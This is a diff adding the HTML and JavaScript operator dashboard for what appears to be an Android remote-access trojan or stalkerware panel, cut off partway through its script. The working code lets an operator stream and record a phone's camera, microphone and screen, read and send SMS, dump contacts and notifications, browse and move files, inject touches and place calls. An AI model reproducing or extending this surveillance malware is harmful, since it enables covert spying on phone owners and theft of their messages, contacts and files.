@@ -1,0 +1,2014 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Remote Control Dashboard</title>
+<script src="/socket.io/socket.io.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0a0f;
+  --bg2:#12121a;
+  --card:#1a1a2e;
+  --hov:#16213e;
+  --acc:#00d4ff;
+  --acc2:#7b2fff;
+  --tx:#e0e0e0;
+  --tx2:#888;
+  --bd:#2a2a3e;
+  --ok:#00ff88;
+  --er:#ff4444;
+  --wn:#ffaa00;
+}
+body{
+  background:var(--bg);
+  color:var(--tx);
+  font-family:'Segoe UI',Tahoma,sans-serif;
+  height:100vh;
+  overflow:hidden;
+}
+
+/* ========== LOGIN ========== */
+#LS{
+  position:fixed;inset:0;
+  display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(135deg,#0a0a0f 0%,#1a1a2e 100%);
+  z-index:9999;
+}
+.lbox{
+  background:var(--card);
+  border:1px solid var(--bd);
+  border-radius:18px;
+  padding:44px;
+  width:420px;
+  max-width:95vw;
+  text-align:center;
+  box-shadow:0 24px 80px rgba(0,0,0,.7);
+}
+.lbox h1{color:var(--acc);font-size:26px;margin-bottom:6px;letter-spacing:-0.5px}
+.lbox p{color:var(--tx2);font-size:13px;margin-bottom:22px}
+.linfo{
+  background:rgba(0,212,255,.07);
+  border:1px solid rgba(0,212,255,.18);
+  border-radius:9px;
+  padding:13px 14px;
+  margin-bottom:20px;
+  font-size:12px;
+  color:var(--tx2);
+  text-align:left;
+  line-height:1.75;
+}
+.linfo strong{color:var(--acc)}
+.linfo code{
+  background:rgba(0,212,255,.12);
+  padding:1px 5px;
+  border-radius:4px;
+  font-size:11px;
+}
+.linput{
+  width:100%;
+  background:var(--bg2);
+  border:1px solid var(--bd);
+  border-radius:9px;
+  padding:13px 16px;
+  color:var(--tx);
+  font-size:15px;
+  outline:none;
+  margin-bottom:14px;
+  transition:border-color .2s;
+  letter-spacing:2px;
+}
+.linput:focus{border-color:var(--acc)}
+.lbtn{
+  width:100%;
+  background:linear-gradient(135deg,var(--acc),var(--acc2));
+  color:#fff;
+  border:none;
+  border-radius:9px;
+  padding:13px;
+  font-size:15px;
+  font-weight:700;
+  cursor:pointer;
+  transition:opacity .2s,transform .1s;
+  letter-spacing:.5px;
+}
+.lbtn:hover{opacity:.9;transform:translateY(-1px)}
+.lbtn:active{transform:translateY(0)}
+#lerr{
+  color:var(--er);
+  font-size:13px;
+  margin-top:10px;
+  min-height:20px;
+}
+
+/* ========== APP SHELL ========== */
+#APP{
+  display:none;
+  height:100vh;
+  flex-direction:column;
+}
+
+/* ========== HEADER ========== */
+.hdr{
+  background:var(--bg2);
+  border-bottom:1px solid var(--bd);
+  padding:10px 20px;
+  display:flex;
+  align-items:center;
+  gap:12px;
+  flex-shrink:0;
+  height:48px;
+}
+.hdr h1{
+  color:var(--acc);
+  font-size:17px;
+  flex:1;
+  font-weight:700;
+  letter-spacing:-.3px;
+}
+.hkey{
+  font-size:11px;
+  color:var(--tx2);
+  background:var(--card);
+  border:1px solid var(--bd);
+  padding:3px 11px;
+  border-radius:20px;
+}
+.hstat{font-size:12px;color:var(--tx2)}
+.hstat b{color:var(--ok);font-size:14px}
+
+/* ========== LAYOUT ========== */
+.layout{
+  display:flex;
+  flex:1;
+  overflow:hidden;
+}
+
+/* ========== SIDEBAR ========== */
+.sidebar{
+  width:248px;
+  background:var(--bg2);
+  border-right:1px solid var(--bd);
+  display:flex;
+  flex-direction:column;
+  overflow:hidden;
+  flex-shrink:0;
+}
+.sbhdr{
+  padding:11px 15px;
+  border-bottom:1px solid var(--bd);
+  font-size:10px;
+  color:var(--tx2);
+  text-transform:uppercase;
+  letter-spacing:1.2px;
+  font-weight:600;
+}
+.devlist{
+  flex:1;
+  overflow-y:auto;
+  padding:7px;
+}
+.devitem{
+  background:var(--card);
+  border:1px solid var(--bd);
+  border-radius:10px;
+  padding:11px 13px;
+  margin-bottom:6px;
+  cursor:pointer;
+  transition:all .2s;
+}
+.devitem:hover{border-color:var(--acc);background:var(--hov)}
+.devitem.sel{border-color:var(--acc2);background:var(--hov)}
+.devname{font-weight:700;font-size:12px;margin-bottom:3px}
+.devst{display:flex;align-items:center;gap:5px;font-size:11px;color:var(--ok)}
+.dot{
+  width:7px;height:7px;
+  border-radius:50%;
+  background:var(--ok);
+  animation:pulse 2s infinite;
+}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.devmeta{font-size:10px;color:var(--tx2);margin-top:3px}
+.emptymsg{
+  padding:24px 16px;
+  text-align:center;
+  color:var(--tx2);
+  font-size:12px;
+}
+
+/* ========== CONTROL PANEL ========== */
+.cpanel{
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  overflow:hidden;
+}
+.nosel{
+  flex:1;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:var(--tx2);
+  font-size:15px;
+  flex-direction:column;
+  gap:10px;
+}
+.nosel .icon{font-size:42px}
+
+/* ========== TABS ========== */
+.tabbar{
+  display:flex;
+  background:var(--bg2);
+  border-bottom:1px solid var(--bd);
+  overflow-x:auto;
+  flex-shrink:0;
+}
+.tabbar::-webkit-scrollbar{height:3px}
+.tabbar::-webkit-scrollbar-thumb{background:var(--bd);border-radius:2px}
+.tabbtn{
+  padding:11px 14px;
+  cursor:pointer;
+  font-size:11px;
+  font-weight:600;
+  color:var(--tx2);
+  border-bottom:2px solid transparent;
+  white-space:nowrap;
+  transition:all .2s;
+  flex-shrink:0;
+  user-select:none;
+}
+.tabBtn:hover{color:var(--tx);background:var(--hov)}
+.tabBtn.on{color:var(--acc);border-bottom-color:var(--acc)}
+
+/* ========== TAB PANELS ========== */
+.tabpanel{
+  flex:1;
+  overflow-y:auto;
+  padding:15px;
+  display:none;
+  flex-direction:column;
+  gap:12px;
+}
+.tabpanel.on{display:flex}
+
+/* ========== CARDS ========== */
+.card{
+  background:var(--card);
+  border:1px solid var(--bd);
+  border-radius:11px;
+  padding:15px;
+}
+.card h3{
+  color:var(--acc);
+  font-size:11px;
+  font-weight:700;
+  margin-bottom:13px;
+  text-transform:uppercase;
+  letter-spacing:.7px;
+}
+
+/* ========== BUTTONS ========== */
+.btn{
+  padding:7px 14px;
+  border:none;
+  border-radius:7px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:700;
+  transition:all .2s;
+  display:inline-flex;
+  align-items:center;
+  gap:5px;
+  white-space:nowrap;
+}
+.btn:hover{opacity:.84;transform:translateY(-1px)}
+.btn:active{transform:translateY(0)}
+.btn:disabled{opacity:.35;cursor:default;transform:none}
+.bprim{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff}
+.bok{background:var(--ok);color:#000}
+.ber{background:var(--er);color:#fff}
+.bwn{background:var(--wn);color:#000}
+.bin{background:rgba(0,212,255,.14);color:var(--acc);border:1px solid rgba(0,212,255,.3)}
+.bsec{background:var(--bg2);color:var(--tx);border:1px solid var(--bd)}
+.bsm{padding:5px 10px;font-size:11px}
+
+/* ========== INPUTS ========== */
+input[type=text],
+input[type=password],
+input[type=number],
+textarea,
+select{
+  background:var(--bg2);
+  border:1px solid var(--bd);
+  border-radius:7px;
+  padding:9px 13px;
+  color:var(--tx);
+  font-size:13px;
+  outline:none;
+  transition:border-color .2s;
+  width:100%;
+  font-family:inherit;
+}
+input:focus,textarea:focus,select:focus{border-color:var(--acc)}
+textarea{min-height:72px;resize:vertical}
+
+/* ========== INFO GRID ========== */
+.igrid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(155px,1fr));
+  gap:8px;
+}
+.iitem{
+  background:var(--bg2);
+  border-radius:8px;
+  padding:11px 12px;
+  border:1px solid var(--bd);
+}
+.ilabel{
+  font-size:9px;
+  color:var(--tx2);
+  text-transform:uppercase;
+  letter-spacing:.5px;
+  margin-bottom:3px;
+}
+.ivalue{font-size:14px;font-weight:700}
+
+/* ========== TABLE ========== */
+.tblwrap{
+  overflow-x:auto;
+  border-radius:8px;
+  border:1px solid var(--bd);
+}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{
+  background:var(--bg2);
+  padding:9px 12px;
+  text-align:left;
+  color:var(--tx2);
+  font-size:10px;
+  text-transform:uppercase;
+  letter-spacing:.5px;
+  font-weight:700;
+}
+td{
+  padding:9px 12px;
+  border-top:1px solid var(--bd);
+  vertical-align:middle;
+}
+tr:hover td{background:var(--hov)}
+
+/* ========== STREAM ========== */
+.stream{
+  background:#000;
+  border-radius:9px;
+  overflow:hidden;
+  position:relative;
+}
+.stream img{
+  max-width:100%;
+  display:none;
+  border-radius:9px;
+}
+.stream img.show{display:block}
+#scrImg{
+  width:100%;
+  cursor:crosshair;
+  -webkit-user-drag:none;
+  user-select:none;
+}
+.strph{
+  height:160px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:var(--tx2);
+  font-size:13px;
+  flex-direction:column;
+  gap:6px;
+}
+
+/* ========== SCREEN BTNS ========== */
+.scrbtns{
+  display:flex;
+  gap:7px;
+  margin-top:9px;
+  flex-wrap:wrap;
+}
+
+/* ========== MESSAGES ========== */
+.msglist{
+  max-height:360px;
+  overflow-y:auto;
+  display:flex;
+  flex-direction:column;
+  gap:6px;
+  padding:4px 2px;
+}
+.mbub{
+  padding:8px 12px;
+  border-radius:10px;
+  max-width:82%;
+  font-size:12px;
+  line-height:1.45;
+}
+.min{
+  background:var(--bg2);
+  border:1px solid var(--bd);
+  align-self:flex-start;
+}
+.mout{
+  background:linear-gradient(135deg,var(--acc2),var(--acc));
+  align-self:flex-end;
+  color:#fff;
+}
+.mmeta{
+  font-size:9px;
+  color:var(--tx2);
+  margin-top:3px;
+}
+.mout .mmeta{color:rgba(255,255,255,.6)}
+
+/* ========== NOTIFICATIONS ========== */
+.nlist{
+  max-height:460px;
+  overflow-y:auto;
+  display:flex;
+  flex-direction:column;
+  gap:5px;
+}
+.nitem{
+  background:var(--bg2);
+  border:1px solid var(--bd);
+  border-radius:8px;
+  padding:10px 12px;
+  border-left:3px solid var(--acc);
+}
+.napp{font-size:10px;color:var(--acc);font-weight:700}
+.ntitle{font-size:13px;font-weight:700;margin:3px 0 2px}
+.ntext{font-size:11px;color:var(--tx2)}
+.ntime{font-size:9px;color:var(--tx2);margin-top:3px}
+
+/* ========== FILES ========== */
+.breadcrumb{
+  display:flex;
+  align-items:center;
+  gap:4px;
+  font-size:11px;
+  color:var(--tx2);
+  margin-bottom:9px;
+  flex-wrap:wrap;
+}
+.breadcrumb span{cursor:pointer;color:var(--acc)}
+.breadcrumb span:hover{text-decoration:underline}
+
+/* ========== PROGRESS ========== */
+.progwrap{
+  margin-top:7px;
+  display:none;
+}
+.progbar{
+  height:5px;
+  background:var(--bg2);
+  border-radius:3px;
+  overflow:hidden;
+  margin-top:4px;
+}
+.progfill{
+  height:100%;
+  background:linear-gradient(90deg,var(--acc),var(--acc2));
+  border-radius:3px;
+  transition:width .3s;
+}
+
+/* ========== AUDIO VIZ ========== */
+.aviz{
+  display:flex;
+  align-items:center;
+  gap:2px;
+  height:34px;
+  margin-top:8px;
+}
+.abar{
+  width:3px;
+  background:var(--acc);
+  border-radius:2px;
+  min-height:3px;
+  transition:height .09s;
+}
+
+/* ========== BADGES ========== */
+.badge{
+  padding:2px 8px;
+  border-radius:10px;
+  font-size:9px;
+  font-weight:700;
+  display:inline-block;
+}
+.bok2{background:rgba(0,255,136,.15);color:var(--ok)}
+.ber2{background:rgba(255,68,68,.15);color:var(--er)}
+.bin2{background:rgba(0,212,255,.15);color:var(--acc)}
+.bwn2{background:rgba(255,170,0,.15);color:var(--wn)}
+
+/* ========== IMAGE PREVIEW MODAL ========== */
+.modal{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.92);
+  z-index:9000;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  gap:14px;
+}
+.modal.open{display:flex}
+.modal img{
+  max-width:93vw;
+  max-height:83vh;
+  border-radius:9px;
+  border:1px solid var(--bd);
+  object-fit:contain;
+}
+.modal-close{
+  background:var(--er);
+  color:#fff;
+  border:none;
+  padding:8px 22px;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:13px;
+  font-weight:700;
+}
+
+/* ========== TOASTS ========== */
+.toastwrap{
+  position:fixed;
+  bottom:18px;
+  right:18px;
+  display:flex;
+  flex-direction:column;
+  gap:5px;
+  z-index:9999;
+  pointer-events:none;
+}
+.toast{
+  background:var(--card);
+  border:1px solid var(--bd);
+  border-radius:8px;
+  padding:9px 13px;
+  font-size:12px;
+  max-width:260px;
+  animation:tsIn .25s;
+  pointer-events:all;
+}
+.tok{border-left:3px solid var(--ok)}
+.ter{border-left:3px solid var(--er)}
+.tin{border-left:3px solid var(--acc)}
+.twn{border-left:3px solid var(--wn)}
+@keyframes tsIn{
+  from{transform:translateX(80px);opacity:0}
+  to{transform:none;opacity:1}
+}
+
+/* ========== UTILS ========== */
+.flex{display:flex}
+.gap6{gap:6px}
+.gap8{gap:8px}
+.wrap{flex-wrap:wrap}
+.mt8{margin-top:8px}
+.mt10{margin-top:10px}
+.mt12{margin-top:12px}
+.w100{width:100%}
+.col{flex-direction:column}
+
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:var(--bg2)}
+::-webkit-scrollbar-thumb{background:var(--bd);border-radius:2px}
+::-webkit-scrollbar-thumb:hover{background:var(--tx2)}
+</style>
+</head>
+<body>
+
+<!-- ========== LOGIN SCREEN ========== -->
+<div id="LS">
+  <div class="lbox">
+    <h1>⚡ Remote Control</h1>
+    <p>Professional Device Management Dashboard</p>
+    <div class="linfo">
+      <strong>How the key system works:</strong><br>
+      • Each device app has a key set in <code>assets/key.txt</code><br>
+      • Enter that exact key below to see matching devices<br>
+      • Different keys = completely separate device groups<br>
+      • No hardcoded key — any key is valid
+    </div>
+    <input
+      class="linput"
+      type="password"
+      id="lkey"
+      placeholder="Enter your access key..."
+      onkeypress="if(event.key==='Enter')doLogin()"
+    />
+    <button class="lbtn" onclick="doLogin()">🔓 Connect to Dashboard</button>
+    <div id="lerr"></div>
+  </div>
+</div>
+
+<!-- ========== MAIN APP ========== -->
+<div id="APP">
+
+  <!-- HEADER -->
+  <div class="hdr">
+    <h1>⚡ Remote Control</h1>
+    <span class="hkey" id="hkeyLabel"></span>
+    <span class="hstat">
+      Online: <b id="onlineCnt">0</b>
+    </span>
+    <button class="btn bsec bsm" onclick="location.reload()">Logout</button>
+  </div>
+
+  <!-- BODY -->
+  <div class="layout">
+
+    <!-- SIDEBAR -->
+    <div class="sidebar">
+      <div class="sbhdr">Your Devices</div>
+      <div class="devlist" id="devList">
+        <div class="emptymsg">Waiting for devices to connect...</div>
+      </div>
+    </div>
+
+    <!-- CONTROL PANEL -->
+    <div class="cpanel">
+
+      <!-- No device selected -->
+      <div class="nosel" id="noselMsg">
+        <div class="icon">📱</div>
+        Select a device from the sidebar
+      </div>
+
+      <!-- Device tabs & content -->
+      <div id="devCtrl"
+           style="display:none;flex:1;overflow:hidden;flex-direction:column">
+
+        <!-- TAB BAR -->
+        <div class="tabbar" id="tabbar">
+          <div class="tabBtn on" onclick="goTab('inf')" id="TB-inf">📊 Info</div>
+          <div class="tabBtn" onclick="goTab('cam')" id="TB-cam">📷 Camera</div>
+          <div class="tabBtn" onclick="goTab('aud')" id="TB-aud">🎤 Audio</div>
+          <div class="tabBtn" onclick="goTab('scr')" id="TB-scr">🖥 Screen</div>
+          <div class="tabBtn" onclick="goTab('sms')" id="TB-sms">💬 SMS</div>
+          <div class="tabBtn" onclick="goTab('con')" id="TB-con">👤 Contacts</div>
+          <div class="tabBtn" onclick="goTab('fil')" id="TB-fil">📁 Files</div>
+          <div class="tabBtn" onclick="goTab('app')" id="TB-app">📱 Apps</div>
+          <div class="tabBtn" onclick="goTab('not')" id="TB-not">🔔 Notifs</div>
+          <div class="tabBtn" onclick="goTab('rem')" id="TB-rem">🕹 Remote</div>
+        </div>
+
+        <!-- ===== INFO TAB ===== -->
+        <div class="tabpanel on" id="TP-inf">
+          <div class="card">
+            <h3>Device Information</h3>
+            <div class="igrid">
+              <div class="iitem">
+                <div class="ilabel">Model</div>
+                <div class="ivalue" id="I-model">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">Android Version</div>
+                <div class="ivalue" id="I-android">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">Battery</div>
+                <div class="ivalue" id="I-battery">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">Charging</div>
+                <div class="ivalue" id="I-charging">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">Network</div>
+                <div class="ivalue" id="I-network">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">WiFi SSID</div>
+                <div class="ivalue" id="I-wifi">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">SIM Operator</div>
+                <div class="ivalue" id="I-sim">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">Storage</div>
+                <div class="ivalue" id="I-storage"
+                     style="font-size:11px">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">Current App</div>
+                <div class="ivalue" id="I-curapp"
+                     style="font-size:10px">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">Screen State</div>
+                <div class="ivalue" id="I-screen">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">Phone Number</div>
+                <div class="ivalue" id="I-phone">—</div>
+              </div>
+              <div class="iitem">
+                <div class="ilabel">Last Update</div>
+                <div class="ivalue" id="I-upd"
+                     style="font-size:10px">—</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ===== CAMERA TAB ===== -->
+        <div class="tabpanel" id="TP-cam">
+          <div class="card">
+            <h3>Camera Stream</h3>
+            <div class="flex gap6 wrap mt8"
+                 style="margin-bottom:11px">
+              <select id="camType"
+                      style="width:auto;padding:7px 10px">
+                <option value="back">Back Camera</option>
+                <option value="front">Front Camera</option>
+              </select>
+              <button class="btn bok bsm"
+                      onclick="camStart()">▶ Stream</button>
+              <button class="btn ber bsm"
+                      onclick="camStop()">⏹ Stop</button>
+              <button class="btn bwn bsm"
+                      id="btnCamRec"
+                      onclick="camToggleRec()">⏺ Record</button>
+            </div>
+            <div class="stream">
+              <img id="camImg" alt="Camera" />
+              <div id="camPH" class="strph">
+                📷 Camera stream will appear here
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <h3>Camera Recordings</h3>
+            <button class="btn bsec bsm"
+                    onclick="loadRecs('Camera')">🔄 Refresh</button>
+            <div id="recCam" class="mt8"></div>
+          </div>
+        </div>
+
+        <!-- ===== AUDIO TAB ===== -->
+        <div class="tabpanel" id="TP-aud">
+          <div class="card">
+            <h3>Audio Stream</h3>
+            <div class="flex gap6 wrap">
+              <button class="btn bok bsm"
+                      onclick="audStart()">▶ Stream</button>
+              <button class="btn ber bsm"
+                      onclick="audStop()">⏹ Stop</button>
+              <button class="btn bwn bsm"
+                      id="btnAudRec"
+                      onclick="audToggleRec()">⏺ Record</button>
+            </div>
+            <div class="aviz" id="aviz"></div>
+            <div id="audStatus"
+                 style="font-size:11px;color:var(--tx2);margin-top:6px">
+              Not streaming
+            </div>
+          </div>
+          <div class="card">
+            <h3>Audio Recordings</h3>
+            <button class="btn bsec bsm"
+                    onclick="loadRecs('Audio')">🔄 Refresh</button>
+            <div id="recAud" class="mt8"></div>
+          </div>
+        </div>
+
+        <!-- ===== SCREEN TAB ===== -->
+        <div class="tabpanel" id="TP-scr">
+          <div class="card">
+            <h3>Screen Stream &amp; Touch Control</h3>
+            <div class="flex gap6 wrap"
+                 style="margin-bottom:11px">
+              <button class="btn bok bsm"
+                      onclick="scrStart()">▶ Stream</button>
+              <button class="btn ber bsm"
+                      onclick="scrStop()">⏹ Stop</button>
+              <button class="btn bwn bsm"
+                      id="btnScrRec"
+                      onclick="scrToggleRec()">⏺ Record</button>
+            </div>
+            <div class="stream" id="scrWrap">
+              <img id="scrImg" alt="Screen" draggable="false" />
+              <div id="scrPH" class="strph">
+                🖥 Screen stream will appear here<br>
+                <span style="font-size:10px;color:var(--tx2)">
+                  Click = Tap &nbsp;|&nbsp; Drag = Swipe
+                </span>
+              </div>
+            </div>
+            <div class="scrbtns">
+              <button class="btn bsec bsm"
+                      onclick="cmd({action:'press_back'})">
+                ◀ Back
+              </button>
+              <button class="btn bsec bsm"
+                      onclick="cmd({action:'press_home'})">
+                ⌂ Home
+              </button>
+              <button class="btn bsec bsm"
+                      onclick="cmd({action:'press_recents'})">
+                ⊟ Recents
+              </button>
+            </div>
+          </div>
+          <div class="card">
+            <h3>Screen Recordings</h3>
+            <button class="btn bsec bsm"
+                    onclick="loadRecs('Screen')">🔄 Refresh</button>
+            <div id="recScr" class="mt8"></div>
+          </div>
+        </div>
+
+        <!-- ===== SMS TAB ===== -->
+        <div class="tabpanel" id="TP-sms">
+          <div class="card">
+            <h3>SMS Messages</h3>
+            <button class="btn bprim bsm"
+                    style="width:auto;margin-bottom:11px"
+                    onclick="cmd({action:'get_messages'})">
+              🔄 Load Messages
+            </button>
+            <div class="msglist" id="msgList">
+              <div style="text-align:center;color:var(--tx2);padding:20px">
+                Click Load Messages to fetch SMS
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <h3>Send New SMS</h3>
+            <div class="flex col gap6">
+              <input type="text" id="smsNum"
+                     placeholder="Phone number e.g. +1234567890" />
+              <textarea id="smsBody"
+                        placeholder="Type your message..."></textarea>
+              <button class="btn bprim bsm"
+                      style="width:auto"
+                      onclick="sendSMS()">📤 Send SMS</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- ===== CONTACTS TAB ===== -->
+        <div class="tabpanel" id="TP-con">
+          <div class="card">
+            <h3>Phone Contacts</h3>
+            <div class="flex gap6 wrap" style="margin-bottom:11px">
+              <button class="btn bprim bsm"
+                      onclick="cmd({action:'get_contacts'})">
+                🔄 Load Contacts
+              </button>
+              <button class="btn bok bsm"
+                      onclick="cmd({action:'download_contacts'})">
+                ⬇ Download TXT
+              </button>
+              <input type="text"
+                     id="conSearch"
+                     placeholder="Search contacts..."
+                     style="flex:1;min-width:120px"
+                     oninput="filterContacts()" />
+            </div>
+            <div id="conList"></div>
+          </div>
+        </div>
+
+        <!-- ===== FILES TAB ===== -->
+        <div class="tabpanel" id="TP-fil">
+          <div class="card">
+            <h3>File Browser</h3>
+            <div class="flex gap6 wrap" style="margin-bottom:11px">
+              <button class="btn bprim bsm"
+                      onclick="browseFiles('/')">🏠 Root</button>
+              <button class="btn bsec bsm"
+                      onclick="goUp()">⬆ Up</button>
+              <input type="file" id="uploadInput"
+                     style="display:none"
+                     onchange="doUpload()" />
+              <button class="btn bok bsm"
+                      onclick="document.getElementById('uploadInput').click()">
+                ⬆ Upload File
+              </button>
+            </div>
+
+            <div class="breadcrumb" id="breadcrumb">
+              <span onclick="browseFiles('/')">📱 Device</span>
+            </div>
+
+            <div class="progwrap" id="uploadProg">
+              <div style="font-size:11px;color:var(--tx2)">Uploading...</div>
+              <div class="progbar">
+                <div class="progfill" id="uploadFill"
+                     style="width:0%"></div>
+              </div>
+            </div>
+
+            <div class="progwrap" id="downloadProg">
+              <div style="font-size:11px;color:var(--tx2)"
+                   id="downloadProgTxt">Downloading...</div>
+              <div class="progbar">
+                <div class="progfill" id="downloadFill"
+                     style="width:0%"></div>
+              </div>
+            </div>
+
+            <div id="fileList" class="mt8"></div>
+          </div>
+        </div>
+
+        <!-- ===== APPS TAB ===== -->
+        <div class="tabpanel" id="TP-app">
+          <div class="card">
+            <h3>Installed Applications</h3>
+            <div class="flex gap6" style="margin-bottom:11px">
+              <button class="btn bprim bsm"
+                      onclick="cmd({action:'get_apps'})">
+                🔄 Load Apps
+              </button>
+              <input type="text"
+                     id="appSearch"
+                     placeholder="Search apps..."
+                     style="flex:1"
+                     oninput="filterApps()" />
+            </div>
+            <div id="appList"></div>
+          </div>
+        </div>
+
+        <!-- ===== NOTIFICATIONS TAB ===== -->
+        <div class="tabpanel" id="TP-not">
+          <div class="card">
+            <h3>Live Notifications</h3>
+            <button class="btn ber bsm"
+                    style="margin-bottom:11px"
+                    onclick="clearNotifs()">
+              🗑 Clear All
+            </button>
+            <div class="nlist" id="notifList">
+              <div style="text-align:center;color:var(--tx2);padding:20px">
+                Notifications will appear here in real time
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ===== REMOTE TAB ===== -->
+        <div class="tabpanel" id="TP-rem">
+          <div class="card">
+            <h3>Show Popup Message on Phone</h3>
+            <div class="flex gap6">
+              <input type="text" id="popupMsg"
+                     placeholder="Message to display on phone..."
+                     style="flex:1" />
+              <button class="btn bprim bsm"
+                      onclick="sendPopup()">Send</button>
+            </div>
+          </div>
+          <div class="card">
+            <h3>Open Website on Phone Browser</h3>
+            <div class="flex gap6">
+              <input type="text" id="urlInput"
+                     placeholder="https://example.com"
+                     style="flex:1" />
+              <button class="btn bprim bsm"
+                      onclick="openURL()">Open</button>
+            </div>
+          </div>
+          <div class="card">
+            <h3>Make Phone Call</h3>
+            <div class="flex gap6">
+              <input type="text" id="callNumber"
+                     placeholder="Phone number..."
+                     style="flex:1" />
+              <button class="btn bok bsm"
+                      onclick="makeCall()">📞 Call</button>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /devCtrl -->
+    </div><!-- /cpanel -->
+  </div><!-- /layout -->
+</div><!-- /APP -->
+
+<!-- ========== IMAGE PREVIEW MODAL ========== -->
+<div class="modal" id="previewModal">
+  <img id="previewImg" src="" alt="Image Preview" />
+  <button class="modal-close"
+          onclick="closePreview()">✕ Close Preview</button>
+</div>
+
+<!-- ========== TOASTS ========== -->
+<div class="toastwrap" id="toastWrap"></div>
+
+<!-- ========== SCRIPT ========== -->
+<script>
+// ============================================================
+//  STATE
+// ============================================================
+const socket = io({ transports: ['websocket', 'polling'] });
+
+let AUTH_KEY   = '';
+let CUR_DEV    = null;
+let CUR_PATH   = '/';
+let ALL_CON    = [];
+let ALL_APP    = [];
+let PHONE_W    = 1080;
+let PHONE_H    = 1920;
+let AUDIO_CTX  = null;
+
+const STREAMING = { cam: false, aud: false, scr: false };
+const RECORDING = { cam: false, aud: false, scr: false };
+
+// touch state for screen control
+let mDown = false;
+let mStartX = 0, mStartY = 0, mStartT = 0;
+let mDrag = false;
+
+// ============================================================
+//  LOGIN
+// ============================================================
+function doLogin() {
+  const key = (document.getElementById('lkey').value || '').trim();
+  if (!key) {
+    document.getElementById('lerr').textContent = 'Please enter your key';
+    return;
+  }
+  document.getElementById('lerr').textContent = '';
+
+  socket.emit('dashboard_auth', { key }, function(res) {
+    if (res && res.success) {
+      AUTH_KEY = key;
+
+      // Hide login, show app
+      document.getElementById('LS').style.display = 'none';
+      const app = document.getElementById('APP');
+      app.style.display = 'flex';
+      app.style.flexDirection = 'column';
+
+      document.getElementById('hkeyLabel').textContent = '🔑 ' + key;
+
+      // Add any already-online devices
+      (res.devices || []).forEach(function(d) {
+        addDevice(d.deviceName, d.info);
+      });
+      updateCount();
+
+      toast('Connected  ·  Key: ' + key, 'ok');
+    } else {
+      document.getElementById('lerr').textContent =
+        (res && res.error) ? res.error : 'Connection failed';
+    }
+  });
+}
+
+document.getElementById('lkey')
+  .addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') doLogin();
+  });
+
+// ============================================================
+//  SOCKET EVENTS
+// ============================================================
+socket.on('connect', function() {
+  console.log('[socket] connected');
+});
+
+socket.on('disconnect', function() {
+  toast('Lost server connection', 'er');
+});
+
+socket.on('device_connected', function(d) {
+  addDevice(d.deviceName, d.info || {});
+  updateCount();
+  toast('Device online: ' + d.deviceName, 'ok');
+});
+
+socket.on('device_disconnected', function(d) {
+  removeDevice(d.deviceName);
+  updateCount();
+  toast('Device offline: ' + d.deviceName, 'er');
+});
+
+socket.on('device_info_update', function(d) {
+  if (d.deviceName === CUR_DEV) updateInfoPanel(d);
+  updateSidebarMeta(d);
+});
+
+socket.on('camera_frame', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
+  var img = document.getElementById('camImg');
+  img.src = 'data:image/jpeg;base64,' + d.frame;
+  img.classList.add('show');
+  document.getElementById('camPH').style.display = 'none';
+});
+
+socket.on('screen_frame', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
+  var img = document.getElementById('scrImg');
+  img.src = 'data:image/jpeg;base64,' + d.frame;
+  img.classList.add('show');
+  document.getElementById('scrPH').style.display = 'none';
+  if (d.width)  PHONE_W = d.width;
+  if (d.height) PHONE_H = d.height;
+});
+
+socket.on('audio_chunk', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
+  playAudioChunk(d.audio);
+  animAudioViz();
+});
+
+socket.on('messages_data', function(d) {
+  if (d.deviceName === CUR_DEV) renderMessages(d.messages);
+});
+
+socket.on('new_sms', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
+  toast('New SMS from ' + d.address, 'in');
+  prependMessage({ address: d.address, body: d.body,
+                   date: d.date, type: 'inbox' });
+});
+
+socket.on('sms_sent', function(d) {
+  if (d.deviceName === CUR_DEV) toast('SMS sent!', 'ok');
+});
+
+socket.on('contacts_data', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
+  ALL_CON = d.contacts || [];
+  renderContacts(ALL_CON);
+});
+
+socket.on('contacts_download_ready', function(d) {
+  var a = document.createElement('a');
+  a.href = d.url; a.download = d.filename; a.click();
+  toast('Contacts downloaded', 'ok');
+});
+
+socket.on('files_data', function(d) {
+  if (d.deviceName === CUR_DEV) renderFiles(d.files, d.path);
+});
+
+socket.on('file_download_progress', function(d) {
+  if (d.deviceName !== CUR_DEV) return;
